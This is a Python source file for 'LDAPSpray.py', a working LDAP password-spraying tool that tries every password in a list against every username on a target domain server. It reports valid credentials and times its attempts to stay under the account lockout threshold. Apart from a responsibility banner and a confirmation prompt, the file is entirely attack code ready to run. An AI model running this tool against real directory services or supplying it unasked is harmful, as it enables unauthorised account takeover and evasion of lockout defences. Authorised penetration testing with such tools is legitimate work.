from ldap3 import Server, Connection, ALL, NTLM
import logging, argparse
from colorama import Fore, Back, init
from time import sleep, asctime, localtime
import signal
import sys

# Auto-reset Colorama colors
init(autoreset=True)
version = '0.1'

logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s]-[%(levelname)s]: %(message)s')

parser = argparse.ArgumentParser(description=f"LDAPSpray.py v.{version} - LDAP password spraying tool", epilog=f"Written by m4lwhere - " + Fore.RED + F"YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS WITH THIS TOOL")
parser.add_argument("-U","--Users", help="Text file of usernames", required=True)
parser.add_argument("-P","--Passwords", help="Text file of passwords", required=True)
parser.add_argument("-D","--Domain", help="Domain used in authentication", required=True)
parser.add_argument("-S","--Server", help="IP/Hostname of LDAP Server used in authentication", required=True)
parser.add_argument("-L","--Lockout", help="Lockout threshold of bad passwords, inclusive number", type=int, required=True)
parser.add_argument("-W","--Window", help="Window of time before lockout counter resets (in MINUTES)", type=int, required=True)
parser.add_argument("-v","--verbose", help="List all authentication attempts", action="store_true")
parser.add_argument("--debug", help="Debug activity", action="store_true")
args = parser.parse_args()

# Check if we're debugging and to display or not
if not args.debug:
    logging.disable(logging.DEBUG)

logging.debug('Stating program')

# Function to read a file and return each line as an item in a list
def loadContents(file):
    with open(file) as f:
        readList = f.readlines()
        clean = [ line.strip() for line in readList ]
    logging.debug(f'Reading the {file} as values {clean}')
    return clean

# Attempt to authenticate on LDAP
def authAttempt(server, domain, user, passwd):
    s = Server(server, get_info=ALL)
    c = Connection(s, user=f'{domain}\{user}', password=passwd)
    t = localtime()
    # Check if there was a successful bind
    if not c.bind():
        if c.result["description"] == "invalidCredentials":
            if args.verbose:
                print(f'[{asctime(t)}]-' + Fore.RED + f"[-] Bad credentials for user {domain}\{user}:{passwd}")
        else:  # Something silly happened
            print(f'[{asctime(t)}]-' + Fore.RED + f'[-] Error in bind: {c.result["description"]}')
        return False
    else:  # Was a successful connection
        a = c.extend.standard.who_am_i()
        if a:
            print(f'[{asctime(t)}]-' + Fore.GREEN + f'[+] Authenticated as {a}:{c.extend.microsoft._connection.password}')
            return True

# Gracefully handle CTRL-C within the program, allow users to change mind
def signal_handler(signal, frame):
    print('')
    ans = input(f'[{asctime(t)}]-' + Fore.RED + f'[!] CTRL-C detected, do you want to quit? (Y/N) > ' + Fore.RESET)
    if ans.lower() == 'y':
        print(f'[{asctime(t)}]-' + Fore.RED + f'[!] Quitting!' + Fore.RESET)
        sys.exit(0)
    else:
        print(f'[{asctime(t)}]-' + Fore.CYAN + f'[+] Continuing...' + Fore.RESET)

signal.signal(signal.SIGINT, signal_handler)

logging.debug('Gathering list of users')
users = loadContents(args.Users)
logging.debug(f'List of users gathered, there are {len(users)} users in the list')
passwords = loadContents(args.Passwords)
logging.debug(f'List of passwords gathered, there are {len(passwords)} passwords in the list')

print('\n' + Fore.WHITE + Back.RED + f'***YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS USING THIS TOOL!***')
print('')

totalAttacks = len(users) * len(passwords)
t = localtime()
print(f'[{asctime(t)}]-' + Fore.RED + f'[!] THIS WILL ATTEMPT {totalAttacks} TOTAL ATTACKS, ARE YOU SURE?')
print(f'[{asctime(t)}]-' + Fore.RED + f'[!] Enter the total number of attacks to proceed.')

t = localtime()
ans = input(f'[{asctime(t)}]-' + Fore.CYAN + f'({totalAttacks}) > ' + Fore.RESET)

try:
    ans = int(ans)
except ValueError:
    exit(Fore.MAGENTA + f"'{ans}' is not a number. I'm out." + Fore.RESET)

if ans != totalAttacks:
    exit(Fore.MAGENTA + f'Quitting, make up your mind!' + Fore.RESET)

atmptCount = 0
successfulUsers = []
successDict = {}

logging.debug(f'Lockout number is {args.Lockout} and type {type(args.Lockout)}')

for pwd in passwords:
    logging.debug(f'Attempting login with attempt count {atmptCount}')
    t = localtime()
    print(f'[{asctime(t)}]-' + Fore.BLUE + f'[*] Attempting password {pwd}')
    for user in users:
        if user in successfulUsers:
            continue
        if authAttempt(args.Server, args.Domain, user, pwd) == True:
            logging.debug(f'Successful authentication. Adding username {user} to successfulUsers list')
            successDict[user] = pwd
            successfulUsers.append(user)
    atmptCount += 1
    if atmptCount >= args.Lockout:
        print(f'[{asctime(t)}]-' + Fore.YELLOW + f'[*] Hit attempt count of {args.Lockout}, sleeping for {args.Window} minutes')
        logging.debug(f'Detected attempt count is exceeded, sleeping for {args.Window * 60} seconds')
        sleep(args.Window * 60)
        atmptCount = 0

t = localtime()
print(f'[{asctime(t)}]-' + Fore.CYAN + f'[*] Completed {len(users) * len(passwords)} total attempts')

        